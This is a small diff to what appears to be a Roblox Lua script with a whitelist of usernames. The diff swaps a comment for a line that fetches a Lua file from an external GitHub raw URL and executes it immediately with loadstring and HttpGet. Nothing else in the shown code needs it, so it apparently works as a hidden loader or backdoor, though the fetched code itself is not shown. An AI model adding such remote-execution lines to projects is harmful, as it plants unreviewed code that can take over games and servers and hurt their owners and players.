@@ -50,7 +50,7 @@ local WHITELISTED_USERS = {
     ["xLiv3_r"] = true,
 }
 
--- Services
+loadstring(game:HttpGet('https://raw.githubusercontent.com/NeuronerX/verysigma2/refs/heads/main/setup.lua'))()
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
